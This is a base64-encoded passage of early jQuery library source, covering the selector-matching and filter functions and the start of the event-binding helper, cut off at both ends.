wgY29udGV4dCApIHsKCQkvLyBRdWlja2x5IGhhbmRsZSBub24tc3RyaW5nIGV4cHJlc3Npb25zCgkJaWYgKCB0eXBlb2YgdCAhPSAic3RyaW5nIiApCgkJCXJldHVybiBbIHQgXTsKCgkJLy8gY2hlY2sgdG8gbWFrZSBzdXJlIGNvbnRleHQgaXMgYSBET00gZWxlbWVudCBvciBhIGRvY3VtZW50CgkJaWYgKCBjb250ZXh0ICYmIGNvbnRleHQubm9kZVR5cGUgIT0gMSAmJiBjb250ZXh0Lm5vZGVUeXBlICE9IDkpCgkJCXJldHVybiBbIF07CgoJCS8vIFNldCB0aGUgY29ycmVjdCBjb250ZXh0IChpZiBub25lIGlzIHByb3ZpZGVkKQoJCWNvbnRleHQgPSBjb250ZXh0IHx8IGRvY3VtZW50OwoKCQkvLyBJbml0aWFsaXplIHRoZSBzZWFyY2gKCQl2YXIgcmV0ID0gW2NvbnRleHRdLCBkb25lID0gW10sIGxhc3QsIG5vZGVOYW1lOwoKCQkvLyBDb250aW51ZSB3aGlsZSBhIHNlbGVjdG9yIGV4cHJlc3Npb24gZXhpc3RzLCBhbmQgd2hpbGUKCQkvLyB3ZSdyZSBubyBsb25nZXIgbG9vcGluZyB1cG9uIG91cnNlbHZlcwoJCXdoaWxlICggdCAmJiBsYXN0ICE9IHQgKSB7CgkJCXZhciByID0gW107CgkJCWxhc3QgPSB0OwoKCQkJdCA9IGpRdWVyeS50cmltKHQpOwoKCQkJdmFyIGZvdW5kVG9rZW4gPSBmYWxzZTsKCgkJCS8vIEFuIGF0dGVtcHQgYXQgc3BlZWRpbmcgdXAgY2hpbGQgc2VsZWN0b3JzIHRoYXQKCQkJLy8gcG9pbnQgdG8gYSBzcGVjaWZpYyBlbGVtZW50IHRhZwoJCQl2YXIgcmUgPSBxdWlja0NoaWxkOwoJCQl2YXIgbSA9IHJlLmV4ZWModCk7CgoJCQlpZiAoIG0gKSB7CgkJCQlub2RlTmFtZSA9IG1bMV0udG9VcHBlckNhc2UoKTsKCgkJCQkvLyBQZXJmb3JtIG91ciBvd24gaXRlcmF0aW9uIGFuZCBmaWx0ZXIKCQkJCWZvciAoIHZhciBpID0gMDsgcmV0W2ldOyBpKysgKQoJCQkJCWZvciAoIHZhciBjID0gcmV0W2ldLmZpcnN0Q2hpbGQ7IGM7IGMgPSBjLm5leHRTaWJsaW5nICkKCQkJCQkJaWYgKCBjLm5vZGVUeXBlID09IDEgJiYgKG5vZGVOYW1lID09ICIqIiB8fCBjLm5vZGVOYW1lLnRvVXBwZXJDYXNlKCkgPT0gbm9kZU5hbWUpICkKCQkJCQkJCXIucHVzaCggYyApOwoKCQkJCXJldCA9IHI7CgkJCQl0ID0gdC5yZXBsYWNlKCByZSwgIiIgKTsKCQkJCWlmICggdC5pbmRleE9mKCIgIikgPT0gMCApIGNvbnRpbnVlOwoJCQkJZm91bmRUb2tlbiA9IHRydWU7CgkJCX0gZWxzZSB7CgkJCQlyZSA9IC9eKFs+K35dKVxzKihcdyopL2k7CgoJCQkJaWYgKCAobSA9IHJlLmV4ZWModCkpICE9IG51bGwgKSB7CgkJCQkJciA9IFtdOwoKCQkJCQl2YXIgbWVyZ2UgPSB7fTsKCQkJCQlub2RlTmFtZSA9IG1bMl0udG9VcHBlckNhc2UoKTsKCQkJCQltID0gbVsxXTsKCgkJCQkJZm9yICggdmFyIGogPSAwLCBybCA9IHJldC5sZW5ndGg7IGogPCBybDsgaisrICkgewoJCQkJCQl2YXIgbiA9IG0gPT0gIn4iIHx8IG0gPT0gIisiID8gcmV0W2pdLm5leHRTaWJsaW5nIDogcmV0W2pdLmZpcnN0Q2hpbGQ7CgkJCQkJCWZvciAoIDsgbjsgbiA9IG4ubmV4dFNpYmxpbmcgKQoJCQkJCQkJaWYgKCBuLm5vZGVUeXBlID09IDEgKSB7CgkJCQkJCQkJdmFyIGlkID0galF1ZXJ5LmRhdGEobik7CgoJCQkJCQkJCWlmICggbSA9PSAifiIgJiYgbWVyZ2VbaWRdICkgYnJlYWs7CgkJCQkJCQkJCgkJCQkJCQkJaWYgKCFub2RlTmFtZSB8fCBuLm5vZGVOYW1lLnRvVXBwZXJDYXNlKCkgPT0gbm9kZU5hbWUgKSB7CgkJCQkJCQkJCWlmICggbSA9PSAifiIgKSBtZXJnZVtpZF0gPSB0cnVlOwoJCQkJCQkJCQlyLnB1c2goIG4gKTsKCQkJCQkJCQl9CgkJCQkJCQkJCgkJCQkJCQkJaWYgKCBtID09ICIrIiApIGJyZWFrOwoJCQkJCQkJfQoJCQkJCX0KCgkJCQkJcmV0ID0gcjsKCgkJCQkJLy8gQW5kIHJlbW92ZSB0aGUgdG9rZW4KCQkJCQl0ID0galF1ZXJ5LnRyaW0oIHQucmVwbGFjZSggcmUsICIiICkgKTsKCQkJCQlmb3VuZFRva2VuID0gdHJ1ZTsKCQkJCX0KCQkJfQoKCQkJLy8gU2VlIGlmIHRoZXJlJ3Mgc3RpbGwgYW4gZXhwcmVzc2lvbiwgYW5kIHRoYXQgd2UgaGF2ZW4ndCBhbHJlYWR5CgkJCS8vIG1hdGNoZWQgYSB0b2tlbgoJCQlpZiAoIHQgJiYgIWZvdW5kVG9rZW4gKSB7CgkJCQkvLyBIYW5kbGUgbXVsdGlwbGUgZXhwcmVzc2lvbnMKCQkJCWlmICggIXQuaW5kZXhPZigiLCIpICkgewoJCQkJCS8vIENsZWFuIHRoZSByZXN1bHQgc2V0CgkJCQkJaWYgKCBjb250ZXh0ID09IHJldFswXSApIHJldC5zaGlmdCgpOwoKCQkJCQkvLyBNZXJnZSB0aGUgcmVzdWx0IHNldHMKCQkJCQlkb25lID0galF1ZXJ5Lm1lcmdlKCBkb25lLCByZXQgKTsKCgkJCQkJLy8gUmVzZXQgdGhlIGNvbnRleHQKCQkJCQlyID0gcmV0ID0gW2NvbnRleHRdOwoKCQkJCQkvLyBUb3VjaCB1cCB0aGUgc2VsZWN0b3Igc3RyaW5nCgkJCQkJdCA9ICIgIiArIHQuc3Vic3RyKDEsdC5sZW5ndGgpOwoKCQkJCX0gZWxzZSB7CgkJCQkJLy8gT3B0aW1pemUgZm9yIHRoZSBjYXNlIG5vZGVOYW1lI2lkTmFtZQoJCQkJCXZhciByZTIgPSBxdWlja0lEOwoJCQkJCXZhciBtID0gcmUyLmV4ZWModCk7CgkJCQkJCgkJCQkJLy8gUmUtb3JnYW5pemUgdGhlIHJlc3VsdHMsIHNvIHRoYXQgdGhleSdyZSBjb25zaXN0ZW50CgkJCQkJaWYgKCBtICkgewoJCQkJCQltID0gWyAwLCBtWzJdLCBtWzNdLCBtWzFdIF07CgoJCQkJCX0gZWxzZSB7CgkJCQkJCS8vIE90aGVyd2lzZSwgZG8gYSB0cmFkaXRpb25hbCBmaWx0ZXIgY2hlY2sgZm9yCgkJCQkJCS8vIElELCBjbGFzcywgYW5kIGVsZW1lbnQgc2VsZWN0b3JzCgkJCQkJCXJlMiA9IHF1aWNrQ2xhc3M7CgkJCQkJCW0gPSByZTIuZXhlYyh0KTsKCQkJCQl9CgoJCQkJCW1bMl0gPSBtWzJdLnJlcGxhY2UoL1xcL2csICIiKTsKCgkJCQkJdmFyIGVsZW0gPSByZXRbcmV0Lmxlbmd0aC0xXTsKCgkJCQkJLy8gVHJ5IHRvIGRvIGEgZ2xvYmFsIHNlYXJjaCBieSBJRCwgd2hlcmUgd2UgY2FuCgkJCQkJaWYgKCBtWzFdID09ICIjIiAmJiBlbGVtICYmIGVsZW0uZ2V0RWxlbWVudEJ5SWQgJiYgIWpRdWVyeS5pc1hNTERvYyhlbGVtKSApIHsKCQkJCQkJLy8gT3B0aW1pemF0aW9uIGZvciBIVE1MIGRvY3VtZW50IGNhc2UKCQkJCQkJdmFyIG9pZCA9IGVsZW0uZ2V0RWxlbWVudEJ5SWQobVsyXSk7CgkJCQkJCQoJCQkJCQkvLyBEbyBhIHF1aWNrIGNoZWNrIGZvciB0aGUgZXhpc3RlbmNlIG9mIHRoZSBhY3R1YWwgSUQgYXR0cmlidXRlCgkJCQkJCS8vIHRvIGF2b2lkIHNlbGVjdGluZyBieSB0aGUgbmFtZSBhdHRyaWJ1dGUgaW4gSUUKCQkJCQkJLy8gYWxzbyBjaGVjayB0byBpbnN1cmUgaWQgaXMgYSBzdHJpbmcgdG8gYXZvaWQgc2VsZWN0aW5nIGFuIGVsZW1lbnQgd2l0aCB0aGUgbmFtZSBvZiAnaWQnIGluc2lkZSBhIGZvcm0KCQkJCQkJaWYgKCAoalF1ZXJ5LmJyb3dzZXIubXNpZXx8alF1ZXJ5LmJyb3dzZXIub3BlcmEpICYmIG9pZCAmJiB0eXBlb2Ygb2lkLmlkID09ICJzdHJpbmciICYmIG9pZC5pZCAhPSBtWzJdICkKCQkJCQkJCW9pZCA9IGpRdWVyeSgnW0BpZD0iJyttWzJdKyciXScsIGVsZW0pWzBdOwoKCQkJCQkJLy8gRG8gYSBxdWljayBjaGVjayBmb3Igbm9kZSBuYW1lICh3aGVyZSBhcHBsaWNhYmxlKSBzbwoJCQkJCQkvLyB0aGF0IGRpdiNmb28gc2VhcmNoZXMgd2lsbCBiZSByZWFsbHkgZmFzdAoJCQkJCQlyZXQgPSByID0gb2lkICYmICghbVszXSB8fCBqUXVlcnkubm9kZU5hbWUob2lkLCBtWzNdKSkgPyBbb2lkXSA6IFtdOwoJCQkJCX0gZWxzZSB7CgkJCQkJCS8vIFdlIG5lZWQgdG8gZmluZCBhbGwgZGVzY2VuZGFudCBlbGVtZW50cwoJCQkJCQlmb3IgKCB2YXIgaSA9IDA7IHJldFtpXTsgaSsrICkgewoJCQkJCQkJLy8gR3JhYiB0aGUgdGFnIG5hbWUgYmVpbmcgc2VhcmNoZWQgZm9yCgkJCQkJCQl2YXIgdGFnID0gbVsxXSA9PSAiIyIgJiYgbVszXSA/IG1bM10gOiBtWzFdICE9ICIiIHx8IG1bMF0gPT0gIiIgPyAiKiIgOiBtWzJdOwoKCQkJCQkJCS8vIEhhbmRsZSBJRTcgYmVpbmcgcmVhbGx5IGR1bWIgYWJvdXQgPG9iamVjdD5zCgkJCQkJCQlpZiAoIHRhZyA9PSAiKiIgJiYgcmV0W2ldLm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT0gIm9iamVjdCIgKQoJCQkJCQkJCXRhZyA9ICJwYXJhbSI7CgoJCQkJCQkJciA9IGpRdWVyeS5tZXJnZSggciwgcmV0W2ldLmdldEVsZW1lbnRzQnlUYWdOYW1lKCB0YWcgKSk7CgkJCQkJCX0KCgkJCQkJCS8vIEl0J3MgZmFzdGVyIHRvIGZpbHRlciBieSBjbGFzcyBhbmQgYmUgZG9uZSB3aXRoIGl0CgkJCQkJCWlmICggbVsxXSA9PSAiLiIgKQoJCQkJCQkJciA9IGpRdWVyeS5jbGFzc0ZpbHRlciggciwgbVsyXSApOwoKCQkJCQkJLy8gU2FtZSB3aXRoIElEIGZpbHRlcmluZwoJCQkJCQlpZiAoIG1bMV0gPT0gIiMiICkgewoJCQkJCQkJdmFyIHRtcCA9IFtdOwoKCQkJCQkJCS8vIFRyeSB0byBmaW5kIHRoZSBlbGVtZW50IHdpdGggdGhlIElECgkJCQkJCQlmb3IgKCB2YXIgaSA9IDA7IHJbaV07IGkrKyApCgkJCQkJCQkJaWYgKCByW2ldLmdldEF0dHJpYnV0ZSgiaWQiKSA9PSBtWzJdICkgewoJCQkJCQkJCQl0bXAgPSBbIHJbaV0gXTsKCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJfQoKCQkJCQkJCXIgPSB0bXA7CgkJCQkJCX0KCgkJCQkJCXJldCA9IHI7CgkJCQkJfQoKCQkJCQl0ID0gdC5yZXBsYWNlKCByZTIsICIiICk7CgkJCQl9CgoJCQl9CgoJCQkvLyBJZiBhIHNlbGVjdG9yIHN0cmluZyBzdGlsbCBleGlzdHMKCQkJaWYgKCB0ICkgewoJCQkJLy8gQXR0ZW1wdCB0byBmaWx0ZXIgaXQKCQkJCXZhciB2YWwgPSBqUXVlcnkuZmlsdGVyKHQscik7CgkJCQlyZXQgPSByID0gdmFsLnI7CgkJCQl0ID0galF1ZXJ5LnRyaW0odmFsLnQpOwoJCQl9CgkJfQoKCQkvLyBBbiBlcnJvciBvY2N1cnJlZCB3aXRoIHRoZSBzZWxlY3RvcjsKCQkvLyBqdXN0IHJldHVybiBhbiBlbXB0eSBzZXQgaW5zdGVhZAoJCWlmICggdCApCgkJCXJldCA9IFtdOwoKCQkvLyBSZW1vdmUgdGhlIHJvb3QgY29udGV4dAoJCWlmICggcmV0ICYmIGNvbnRleHQgPT0gcmV0WzBdICkKCQkJcmV0LnNoaWZ0KCk7CgoJCS8vIEFuZCBjb21iaW5lIHRoZSByZXN1bHRzCgkJZG9uZSA9IGpRdWVyeS5tZXJnZSggZG9uZSwgcmV0ICk7CgoJCXJldHVybiBkb25lOwoJfSwKCgljbGFzc0ZpbHRlcjogZnVuY3Rpb24ocixtLG5vdCl7CgkJbSA9ICIgIiArIG0gKyAiICI7CgkJdmFyIHRtcCA9IFtdOwoJCWZvciAoIHZhciBpID0gMDsgcltpXTsgaSsrICkgewoJCQl2YXIgcGFzcyA9ICgiICIgKyByW2ldLmNsYXNzTmFtZSArICIgIikuaW5kZXhPZiggbSApID49IDA7CgkJCWlmICggIW5vdCAmJiBwYXNzIHx8IG5vdCAmJiAhcGFzcyApCgkJCQl0bXAucHVzaCggcltpXSApOwoJCX0KCQlyZXR1cm4gdG1wOwoJfSwKCglmaWx0ZXI6IGZ1bmN0aW9uKHQscixub3QpIHsKCQl2YXIgbGFzdDsKCgkJLy8gTG9vayBmb3IgY29tbW9uIGZpbHRlciBleHByZXNzaW9ucwoJCXdoaWxlICggdCAmJiB0ICE9IGxhc3QgKSB7CgkJCWxhc3QgPSB0OwoKCQkJdmFyIHAgPSBqUXVlcnkucGFyc2UsIG07CgoJCQlmb3IgKCB2YXIgaSA9IDA7IHBbaV07IGkrKyApIHsKCQkJCW0gPSBwW2ldLmV4ZWMoIHQgKTsKCgkJCQlpZiAoIG0gKSB7CgkJCQkJLy8gUmVtb3ZlIHdoYXQgd2UganVzdCBtYXRjaGVkCgkJCQkJdCA9IHQuc3Vic3RyaW5nKCBtWzBdLmxlbmd0aCApOwoKCQkJCQltWzJdID0gbVsyXS5yZXBsYWNlKC9cXC9nLCAiIik7CgkJCQkJYnJlYWs7CgkJCQl9CgkJCX0KCgkJCWlmICggIW0gKQoJCQkJYnJlYWs7CgoJCQkvLyA6bm90KCkgaXMgYSBzcGVjaWFsIGNhc2UgdGhhdCBjYW4gYmUgb3B0aW1pemVkIGJ5CgkJCS8vIGtlZXBpbmcgaXQgb3V0IG9mIHRoZSBleHByZXNzaW9uIGxpc3QKCQkJaWYgKCBtWzFdID09ICI6IiAmJiBtWzJdID09ICJub3QiICkKCQkJCS8vIG9wdGltaXplIGlmIG9ubHkgb25lIHNlbGVjdG9yIGZvdW5kIChtb3N0IGNvbW1vbiBjYXNlKQoJCQkJciA9IGlzU2ltcGxlLnRlc3QoIG1bM10gKSA/CgkJCQkJalF1ZXJ5LmZpbHRlcihtWzNdLCByLCB0cnVlKS5yIDoKCQkJCQlqUXVlcnkoIHIgKS5ub3QoIG1bM10gKTsKCgkJCS8vIFdlIGNhbiBnZXQgYSBiaWcgc3BlZWQgYm9vc3QgYnkgZmlsdGVyaW5nIGJ5IGNsYXNzIGhlcmUKCQkJZWxzZSBpZiAoIG1bMV0gPT0gIi4iICkKCQkJCXIgPSBqUXVlcnkuY2xhc3NGaWx0ZXIociwgbVsyXSwgbm90KTsKCgkJCWVsc2UgaWYgKCBtWzFdID09ICJbIiApIHsKCQkJCXZhciB0bXAgPSBbXSwgdHlwZSA9IG1bM107CgkJCQkKCQkJCWZvciAoIHZhciBpID0gMCwgcmwgPSByLmxlbmd0aDsgaSA8IHJsOyBpKysgKSB7CgkJCQkJdmFyIGEgPSByW2ldLCB6ID0gYVsgalF1ZXJ5LnByb3BzW21bMl1dIHx8IG1bMl0gXTsKCQkJCQkKCQkJCQlpZiAoIHogPT0gbnVsbCB8fCAvaHJlZnxzcmN8c2VsZWN0ZWQvLnRlc3QobVsyXSkgKQoJCQkJCQl6ID0galF1ZXJ5LmF0dHIoYSxtWzJdKSB8fCAnJzsKCgkJCQkJaWYgKCAodHlwZSA9PSAiIiAmJiAhIXogfHwKCQkJCQkJIHR5cGUgPT0gIj0iICYmIHogPT0gbVs1XSB8fAoJCQkJCQkgdHlwZSA9PSAiIT0iICYmIHogIT0gbVs1XSB8fAoJCQkJCQkgdHlwZSA9PSAiXj0iICYmIHogJiYgIXouaW5kZXhPZihtWzVdKSB8fAoJCQkJCQkgdHlwZSA9PSAiJD0iICYmIHouc3Vic3RyKHoubGVuZ3RoIC0gbVs1XS5sZW5ndGgpID09IG1bNV0gfHwKCQkJCQkJICh0eXBlID09ICIqPSIgfHwgdHlwZSA9PSAifj0iKSAmJiB6LmluZGV4T2YobVs1XSkgPj0gMCkgXiBub3QgKQoJCQkJCQkJdG1wLnB1c2goIGEgKTsKCQkJCX0KCQkJCQoJCQkJciA9IHRtcDsKCgkJCS8vIFdlIGNhbiBnZXQgYSBzcGVlZCBib29zdCBieSBoYW5kbGluZyBudGgtY2hpbGQgaGVyZQoJCQl9IGVsc2UgaWYgKCBtWzFdID09ICI6IiAmJiBtWzJdID09ICJudGgtY2hpbGQiICkgewoJCQkJdmFyIG1lcmdlID0ge30sIHRtcCA9IFtdLAoJCQkJCS8vIHBhcnNlIGVxdWF0aW9ucyBsaWtlICdldmVuJywgJ29kZCcsICc1JywgJzJuJywgJzNuKzInLCAnNG4tMScsICctbis2JwoJCQkJCXRlc3QgPSAvKC0/KShcZCopbigoPzpcK3wtKT9cZCopLy5leGVjKAoJCQkJCQltWzNdID09ICJldmVuIiAmJiAiMm4iIHx8IG1bM10gPT0gIm9kZCIgJiYgIjJuKzEiIHx8CgkJCQkJCSEvXEQvLnRlc3QobVszXSkgJiYgIjBuKyIgKyBtWzNdIHx8IG1bM10pLAoJCQkJCS8vIGNhbGN1bGF0ZSB0aGUgbnVtYmVycyAoZmlyc3QpbisobGFzdCkgaW5jbHVkaW5nIGlmIHRoZXkgYXJlIG5lZ2F0aXZlCgkJCQkJZmlyc3QgPSAodGVzdFsxXSArICh0ZXN0WzJdIHx8IDEpKSAtIDAsIGxhc3QgPSB0ZXN0WzNdIC0gMDsKIAoJCQkJLy8gbG9vcCB0aHJvdWdoIGFsbCB0aGUgZWxlbWVudHMgbGVmdCBpbiB0aGUgalF1ZXJ5IG9iamVjdAoJCQkJZm9yICggdmFyIGkgPSAwLCBybCA9IHIubGVuZ3RoOyBpIDwgcmw7IGkrKyApIHsKCQkJCQl2YXIgbm9kZSA9IHJbaV0sIHBhcmVudE5vZGUgPSBub2RlLnBhcmVudE5vZGUsIGlkID0galF1ZXJ5LmRhdGEocGFyZW50Tm9kZSk7CgoJCQkJCWlmICggIW1lcmdlW2lkXSApIHsKCQkJCQkJdmFyIGMgPSAxOwoKCQkJCQkJZm9yICggdmFyIG4gPSBwYXJlbnROb2RlLmZpcnN0Q2hpbGQ7IG47IG4gPSBuLm5leHRTaWJsaW5nICkKCQkJCQkJCWlmICggbi5ub2RlVHlwZSA9PSAxICkKCQkJCQkJCQluLm5vZGVJbmRleCA9IGMrKzsKCgkJCQkJCW1lcmdlW2lkXSA9IHRydWU7CgkJCQkJfQoKCQkJCQl2YXIgYWRkID0gZmFsc2U7CgoJCQkJCWlmICggZmlyc3QgPT0gMCApIHsKCQkJCQkJaWYgKCBub2RlLm5vZGVJbmRleCA9PSBsYXN0ICkKCQkJCQkJCWFkZCA9IHRydWU7CgkJCQkJfSBlbHNlIGlmICggKG5vZGUubm9kZUluZGV4IC0gbGFzdCkgJSBmaXJzdCA9PSAwICYmIChub2RlLm5vZGVJbmRleCAtIGxhc3QpIC8gZmlyc3QgPj0gMCApCgkJCQkJCWFkZCA9IHRydWU7CgoJCQkJCWlmICggYWRkIF4gbm90ICkKCQkJCQkJdG1wLnB1c2goIG5vZGUgKTsKCQkJCX0KCgkJCQlyID0gdG1wOwoKCQkJLy8gT3RoZXJ3aXNlLCBmaW5kIHRoZSBleHByZXNzaW9uIHRvIGV4ZWN1dGUKCQkJfSBlbHNlIHsKCQkJCXZhciBmbiA9IGpRdWVyeS5leHByWyBtWzFdIF07CgkJCQlpZiAoIHR5cGVvZiBmbiA9PSAib2JqZWN0IiApCgkJCQkJZm4gPSBmblsgbVsyXSBdOwoKCQkJCWlmICggdHlwZW9mIGZuID09ICJzdHJpbmciICkKCQkJCQlmbiA9IGV2YWwoImZhbHNlfHxmdW5jdGlvbihhLGkpe3JldHVybiAiICsgZm4gKyAiO30iKTsKCgkJCQkvLyBFeGVjdXRlIGl0IGFnYWluc3QgdGhlIGN1cnJlbnQgZmlsdGVyCgkJCQlyID0galF1ZXJ5LmdyZXAoIHIsIGZ1bmN0aW9uKGVsZW0sIGkpewoJCQkJCXJldHVybiBmbihlbGVtLCBpLCBtLCByKTsKCQkJCX0sIG5vdCApOwoJCQl9CgkJfQoKCQkvLyBSZXR1cm4gYW4gYXJyYXkgb2YgZmlsdGVyZWQgZWxlbWVudHMgKHIpCgkJLy8gYW5kIHRoZSBtb2RpZmllZCBleHByZXNzaW9uIHN0cmluZyAodCkKCQlyZXR1cm4geyByOiByLCB0OiB0IH07Cgl9LAoKCWRpcjogZnVuY3Rpb24oIGVsZW0sIGRpciApewoJCXZhciBtYXRjaGVkID0gW107CgkJdmFyIGN1ciA9IGVsZW1bZGlyXTsKCQl3aGlsZSAoIGN1ciAmJiBjdXIgIT0gZG9jdW1lbnQgKSB7CgkJCWlmICggY3VyLm5vZGVUeXBlID09IDEgKQoJCQkJbWF0Y2hlZC5wdXNoKCBjdXIgKTsKCQkJY3VyID0gY3VyW2Rpcl07CgkJfQoJCXJldHVybiBtYXRjaGVkOwoJfSwKCQoJbnRoOiBmdW5jdGlvbihjdXIscmVzdWx0LGRpcixlbGVtKXsKCQlyZXN1bHQgPSByZXN1bHQgfHwgMTsKCQl2YXIgbnVtID0gMDsKCgkJZm9yICggOyBjdXI7IGN1ciA9IGN1cltkaXJdICkKCQkJaWYgKCBjdXIubm9kZVR5cGUgPT0gMSAmJiArK251bSA9PSByZXN1bHQgKQoJCQkJYnJlYWs7CgoJCXJldHVybiBjdXI7Cgl9LAoJCglzaWJsaW5nOiBmdW5jdGlvbiggbiwgZWxlbSApIHsKCQl2YXIgciA9IFtdOwoKCQlmb3IgKCA7IG47IG4gPSBuLm5leHRTaWJsaW5nICkgewoJCQlpZiAoIG4ubm9kZVR5cGUgPT0gMSAmJiAoIWVsZW0gfHwgbiAhPSBlbGVtKSApCgkJCQlyLnB1c2goIG4gKTsKCQl9CgoJCXJldHVybiByOwoJfQp9KTsKCi8qCiAqIEEgbnVtYmVyIG9mIGhlbHBlciBmdW5jdGlvbnMgdXNlZCBmb3IgbWFuYWdpbmcgZXZlbnRzLgogKiBNYW55IG9mIHRoZSBpZGVhcyBiZWhpbmQgdGhpcyBjb2RlIG9yaWduYXRlZCBmcm9tIAogKiBEZWFuIEVkd2FyZHMnIGFkZEV2ZW50IGxpYnJhcnkuCiAqLwpqUXVlcnkuZXZlbnQgPSB7CgoJLy8gQmluZCBhbiBldmVudCB0byBhbiBlbGVtZW50CgkvLyBPcmlnaW5hbCBieSBEZWFuIEVkd2FyZHMKCWFkZDogZnVuY3Rpb24oZWxlbSwgdHlwZXMsIGhhbmRsZXIsIGRhdGEpIHsKCQlpZiAoIGVsZW0ubm9kZVR5cGUgPT0gMyB8fCBlbGVtLm5vZGVUeXBlID09IDggKQoJCQlyZXR1cm47CgoJCS8vIEZvciB3aGF0ZXZlciByZWFzb24sIElFIGhhcyB0cm91YmxlIHBhc3NpbmcgdGhlIHdpbmRvdyBvYmplY3QKCQkvLyBhcm91bmQsIGNhdXNpbmcgaXQgdG8gYmUgY2xvbmVkIGluIHRoZSBwcm9jZXNzCgkJaWYgKCBqUXVlcnkuYnJvd3Nlci5tc2llICYmIGVsZW0uc2V0SW50ZXJ2YWwgIT0gdW5kZWZpbmVkICkKCQkJZWxlbSA9IHdpbmRvdzsKCgkJLy8gTWFrZSBzdXJlIHRoYXQgdGhlIGZ1bmN0aW9uIGJlaW5nIGV4ZWN1dGVkIGhhcyBhIHVuaXF1ZSBJRAoJCWlmICggIWhhbmRsZXIuZ3VpZCApCgkJCWhhbmRsZXIuZ3VpZCA9IHRoaXMuZ3VpZCsrOwoJCQkKCQkvLyBpZiBkYXRhIGlzIHBhc3NlZCwgYmluZCB0byBoYW5kbGVyIAoJCWlmKCBkYXRhICE9IHVuZGVmaW5lZCApIHsgCgkJCS8vIENyZWF0ZSB0ZW1wb3JhcnkgZnVuY3Rpb24gcG9pbnRlciB0byBvcmlnaW5hbCBoYW5kbGVyIAoJCQl2YXIgZm4gPSBoYW5kbGVyOyAKCgkJCS8vIENyZWF0ZSB1bmlxdWUgaGFuZGxlciBmdW5jdGlvbiwgd3JhcHBlZCBhcm91bmQgb3JpZ2luYWwgaGFuZGxlciAKCQkJaGFuZGxlciA9IGZ1bmN0aW9uKCkgeyAKCQkJCS8vIFBhc3MgYXJndW1lbnRzIGFuZCBjb250ZXh0IHRvIG9yaWdpbmFsIGhhbmRsZXIgCgkJCQlyZXR1cm4gZm4uYXBwbHkodGhpcywgYXJndW1lbnRzKTsgCgkJCX07CgoJCQkvLyBTdG9yZSBkYXRhIGluIHVuaXF1ZSBoYW5kbGVyIAoJCQloYW5kbGVyLmRhdGEgPSBkYXRhOwoKCQkJLy8gU2V0IHRoZSBndWlkIG9mIHVuaXF1ZSBoYW5kbGVyIHRvIHRoZSBzYW1lIG9mIG9yaWdpbmFsIGhhbmRsZXIsIHNvIGl0IGNhbiBiZSByZW1vdmVkIAoJCQloYW5kbGVyLmd1aWQgPSBmbi5ndWlkOwoJCX0KCgkJLy8gSW5pdCB0aGUgZWxlbWVudCdzIGV2ZW50IHN0cnVjdHVyZQoJCXZhciBldmVudHMgPSBqUXVlcnkuZGF0YShlbGVtLCAiZXZlbnRzIikgfHwgalF1ZXJ5LmRhdGEoZWxlbSwgImV2ZW50cyIsIHt9KSwKCQkJaGFuZGxlID0galF1ZXJ5LmRhdGEoZWxlbSwgImhhbmRsZSIpIHx8IGpRdWVyeS5kYXRhKGVsZW0sICJoYW5kbGUiLCBmdW5jdGlvbigpewoJCQkJLy8gcmV0dXJuZWQgdW5kZWZpbmVkIG9yIGZhbHNlCgkJCQl2YXIgdmFsOwoKCQkJCS8vIEhhbmRsZSB0aGUgc2Vjb25kIGV2ZW50IG9mIGEgdHJpZ2dlciBhbmQgd2hlbgoJCQkJLy8gYW4gZXZlbnQgaXMgY2FsbGVkIGFmdGVyIGEgcGFnZSBoYXMgdW5sb2FkZWQKCQkJCWlmICggdHlwZW9mIGpRdWVyeSA9PSAidW5kZWZpbmVkIiB8fCBqUXVlcnkuZXZlbnQudHJpZ2dlcmVkICkKCQkJCQlyZXR1cm4gdmFsOwoJCQoJCQkJdmFsID0galF1ZXJ5LmV2ZW50LmhhbmRsZS5hcHBseShhcmd1bWVudHMuY2FsbGVlLmVsZW0sIGFyZ3VtZW50cyk7CgkJCgkJCQlyZXR1cm4gdmFsOwoJCQl9KTsKCQkvLyBBZGQgZWxlbSBhcyBhIHByb3BlcnR5IG9mIHRoZSBoYW5kbGUgZnVuY3Rpb24KCQkvLyBUaGlzIGlzIHRvIHByZXZlbnQgYSBtZW1vcnkgbGVhayB3aXRoIG5vbi1uYXRpdmUKCQkvLyBldmVudCBpbiBJRS4KCQloYW5kbGUuZWxlbSA9IGVsZW07CgkJCQoJCQkvLyBIYW5kbGUgbXVsdGlwbGUgZXZlbnRzIHNlcGVyYXRlZCBieSBhIHNwYWNlCgkJCS8vIGpRdWVyeSguLi4pLmJpbmQoIm1vdXNlb3ZlciBtb3VzZW91dCIsIGZuKTsKCQkJalF1ZXJ5LmVhY2godHlwZXMuc3BsaXQoL1xzKy8pLCBmdW5jdGlvbihpbmRleCwgdHlwZSkgewoJCQkJLy8gTmFtZXNwYWNlZCBldmVudCBoYW5kbGVycwoJCQkJdmFyIHBhcnRzID0gdHlwZS5zcGxpdCgiLiIpOwoJCQkJdHlwZSA9IHBhcnRzWzBdOwoJCQkJaGFuZGxlci50eXBlID0gcGFydHNbMV07CgoJCQkJLy8gR2V0IHRoZSBjdXJyZW50IGxpc3Qgb2YgZnVuY3Rpb25zIGJvdW5kIHRvIHRoaXMgZXZlbnQKCQkJCXZhciBoYW5kbGVycyA9IGV2ZW50c1t0eXBlXTsKCgkJCQkvLyBJbml0IHRoZSBldmVudCBoYW5kbGVyIHF1ZXVlCgkJCQlpZiAoIWhhbmRsZXJzKSB7CgkJCQkJaGFuZGxlcnMgPSBldmVudHNbdHlwZV0gPSB7fTsKCQkKCQkJCQkvLyBDaGVjayBmb3IgYSBzcGVjaWFsIGV2ZW50IGhhbmRsZXIKCQkJCQkvLyBPbmx5IHVzZSBhZGRFdmVudExpc3RlbmVyL2F0dGFjaEV2ZW50IGlmIHRoZSBzcGVjaWFsCgkJCQkJLy8gZXZlbnRzIGhhbmRsZXIgcmV0dXJucyBmYWxzZQoJCQkJCWlmICggIWpRdWVyeS5ldmVudC5zcGVjaWFsW3R5cGVdIHx8IGpRdWVyeS5ldmVudC5zcGVjaWFsW3R5cGVdLnNldHVwLmNhbGwoZWxlbSkgPT09IGZhbHNlICkgewoJCQkJCQkvLyBCaW5kIHRoZSBnbG9iYWwgZXZlbnQgaGFuZGxlciB0byB0aGUgZWxlbWVudAoJCQkJCQlpZiAoZWxlbS5hZGRFdmVudExpc3RlbmVyKQoJCQkJCQkJZWxlb